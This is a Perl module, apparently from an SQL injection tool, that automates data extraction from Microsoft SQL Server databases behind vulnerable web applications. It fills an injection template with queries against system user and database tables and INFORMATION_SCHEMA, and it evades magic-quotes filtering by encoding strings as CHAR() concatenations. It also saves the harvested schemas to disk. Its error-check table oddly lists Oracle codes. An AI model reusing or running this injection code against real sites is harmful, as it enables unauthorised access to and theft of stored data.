package isr_mssql;
use Data::Dump qw(dump);

#Author: Francisco Amato

my @space=(' ',"\t","/**/");
#Atributos publicos

#Private variable
@db_errors = (
	    {
             'code'  	=>'ORA-00942',
             'message'  =>'table or view does not exist',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-00933',
             'message'  =>'SQL command not properly ended',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-01790',
             'message'  =>'expression must have same datatype as corresponding expression',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-01031',
             'message'  =>'insufficient privileges',
             'type'     =>1
            },
	    {
             'code'  	=>'ORA-00932',
             'message'  =>'inconsistent datatypes',
             'type'     =>1
            }	    
	    );

#testpage
my @col_testpage=('uid','status','name','createdate');
my $coltype_testpage={
  uid          => "smallint",
  status          => "smallint",
  name		=> "varchar",
  createdate	=> "datetime"  
};
my $name_test="master.dbo.sysusers";

#dbsnames
my @col_dbsnames=('NAME');
my $name_dbsnames="master.dbo.sysdatabases";

#dbschema
my @col_dbschema=('.INFORMATION_SCHEMA.TABLES.TABLE_CATALOG', '.INFORMATION_SCHEMA.TABLES.TABLE_NAME', 'COLUMN_NAME', 'DATA_TYPE');
my $name_dbschema="<DBNAME>.INFORMATION_SCHEMA.COLUMNS INNER JOIN <DBNAME>.INFORMATION_SCHEMA.TABLES ON <DBNAME>.INFORMATION_SCHEMA.TABLES.TABLE_NAME=<DBNAME>.INFORMATION_SCHEMA.COLUMNS.TABLE_NAME";

#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia
    $class->{lleno} ||=0;

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}
sub get_dbsnames { my $class = shift; return $class->{dbsnames};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,$coltype_testpage,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{dbsnames}=process_page($class,$name_dbsnames,-1,undef,undef,@col_dbsnames);
}

sub do_dbschema {
    my ($class,$dbname) = @_;
    my $final_n =$name_dbschema;
    $final_n=~ s/\<DBNAME\>/$dbname/gi;
    my @final_col =  map $_ =~ /^\./ ? $dbname.$_ : $_ , @col_dbschema ;
    $class->{dbschema}=process_page($class,$final_n,-1,undef,undef,@final_col);

    print "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.$dbname.dbschema");
    print FF $class->get_dbschema;
    close(FF);		    
    
}


#Private method
sub process_page{
    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;

    my @ncol;
    my @mcol;
    
    #convert all to str
    if ($class->{conn}->{convertall_str}){
	foreach(@col){
	    if ($coltype == -1){
		push @ncol,$_;
	    }
	    elsif($coltype->{$_} eq "image"){
		push @ncol,"convert(varbinary,$_)";
	    }elsif($coltype->{$_} ne "varchar"){
		push @ncol,"convert(varchar,$_)";
	    }else{
		push @ncol,$_;
	    }
	}
    }else {
	@ncol = @col;
    }
    
    #scape output less
    if ($class->{conn}->{scape_output_less}){
	@mcol = map "REPLACE($_,'-','_')" ,@ncol;	
    }else{
	@mcol = @ncol;
    }
    
    #select type of concat
    if ($class->{conn}->{scape_plas}){
        $val = &getconcat2(@mcol);
    }else {
	$val = &getconcat(@mcol);
    }				    

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};
    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;
    $datos=~ s/\<TAIL\>/$mtail/gi;
    
    #Magic quotes evasion
    $datos =~ s/'([^']+)'/magicquotes($1,$class->{conn}->{scape_plas})/egi if $class->{conn}->{'magicquotes'}; #'	    
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}

sub magicquotes {
    my ($val,$option) = @_;
    my @list= map { $_ = 'CHAR('.$_.')' } unpack('C*', $val);

    my $return;
    if ($option){
        $return = &getconcat2_magic(@list);
    }else {
        $return = &getconcat(@list);
	#+'[__]'+
	$return =~ s/\+'\[\_\_\]'\+/\+/gi;
    }
    return $return;
}
		    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str=getvalue($items[0]);
        for (my $i=1;$i <=$can;$i++)
        {
                $str.= "+'[__]'+".getvalue($items[$i]);
        }
        return $str;
}

#ESPECIAL concat but it's the same that getconcat2
#sub getconcat3 {
#        my (@zitems) =@_;
#	@items = reverse ( @zitems );
#	
#        my $can=$#items;
#
#	my $str = "stuff(quotename($items[0]),year(dateadd(yyyy,len($items[0]),'2002'))-2000,0,'[_-_]')";
#	my $str = "stuff(quotename($items[0]),len($items[0])-2*(-1),0,'.[.].')";
#        for (my $i=1;$i <=$can;$i++)
#        {
#        	$str= "stuff(quotename('.[.].'),7,0,$str)";		
#		$str= "stuff(quotename($items[$i]),len($items[$i])-2*(-1),0,$str)";
#        }
#        return $str;
#}

sub getconcat2 {
        my (@items) =@_;
        my $can=$#items;
        my $str="{fn CONCAT({fn CONCAT(".getvalue($items[0]).",'[__]')},".getvalue($items[1]).")}";
        for (my $i=2;$i <=$can;$i++)
        {
                $str= "{fn CONCAT({fn CONCAT(".$str.",'[__]')},".getvalue($items[$i]).")}";
        }
        return $str;
}

sub getconcat2_magic {
        my (@items) =@_;
        my $can=$#items;
        my $str="{fn CONCAT(".getvalue($items[0]).",".getvalue($items[1]).")}";
        for (my $i=2;$i <=$can;$i++)
        {
                $str= "{fn CONCAT(".$str.",".getvalue($items[$i]).")}";
        }
        return $str;
}

sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
